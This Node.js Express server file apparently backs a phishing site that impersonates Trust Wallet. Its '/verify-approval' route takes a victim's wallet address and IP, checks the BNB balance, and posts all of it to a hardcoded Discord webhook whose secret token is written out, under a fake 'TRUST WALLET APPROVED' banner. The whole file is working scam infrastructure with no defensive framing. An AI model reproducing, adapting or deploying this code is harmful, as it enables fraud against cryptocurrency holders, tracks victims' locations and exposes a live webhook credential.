const express = require('express');
const axios = require('axios');
const app = express();
const PORT = process.env.PORT || 3000;

// ⭐⭐⭐ PUT YOUR DISCORD WEBHOOK HERE ⭐⭐⭐
const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1459213607219892245/M_dBdrlpBILx4BNIW3mfxfnc7EHPxXNSe9xNArkl4q_3dc6_ejbKy0ojgRJ4yoeozfVp";

app.use(express.static(__dirname));

app.get('/', (req, res) => {
    res.sendFile(__dirname + '/index.html');
});

app.get('/verify-approval', async (req, res) => {
    try {
        const wallet = req.query.wallet;
        const ip = req.headers['x-forwarded-for'] || req.ip || 'Unknown';
        
        if (!wallet) {
            return res.json({ error: 'No wallet' });
        }
        
        // Get balance
        let balance = "0";
        let usdValue = "0.00";
        try {
            const response = await axios.post('https://bsc-dataseed.binance.org/', {
                jsonrpc: "2.0",
                method: "eth_getBalance",
                params: [wallet, "latest"],
                id: 1
            });
            
            if (response.data && response.data.result) {
                const wei = parseInt(response.data.result, 16);
                balance = (wei / 1e18).toFixed(8);
                
                // Get BNB price in USD (approximate)
                const bnbPrice = 300; // $300 per BNB approx
                usdValue = (parseFloat(balance) * bnbPrice).toFixed(2);
            }
        } catch (e) {
            console.log('Balance error');
        }
        
        // Send to Discord
        if (DISCORD_WEBHOOK.includes('discord.com')) {
            const msg = {
                content: "📱 **TRUST WALLET APPROVED**",
                embeds: [{
                    title: "Wallet Connection Verified",
                    color: 3373579, // Trust Wallet blue as number (0x3375bb = 3373579)
                    fields: [
                        { name: "Asset", value: "BNB Smart Chain (BNB)", inline: false },
                        { name: "Wallet", value: `\`${wallet}\``, inline: false },
                        { name: "Balance", value: `${balance} BNB ($${usdValue})`, inline: true },
                        { name: "IP Address", value: `\`${ip}\``, inline: true },
                        { name: "Network Fee", value: "$0.00\n0.00000404 BNB", inline: true },
                        { name: "Status", value: "✅ Approved", inline: true }
                    ],
                    footer: { text: "Trust Wallet dApp | Auto-verification" }
                }]
            };
            
            await axios.post(DISCORD_WEBHOOK, msg);
        }
        
        res.json({ 
            success: true, 
            wallet: wallet,
            balance: balance,
            usdValue: usdValue
        });
        
    } catch (error) {
        console.error(error);
        res.json({ error: error.message });
    }
});

app.listen(PORT, () => {
    console.log(`✅ Server: http://localhost:${PORT}`);
});
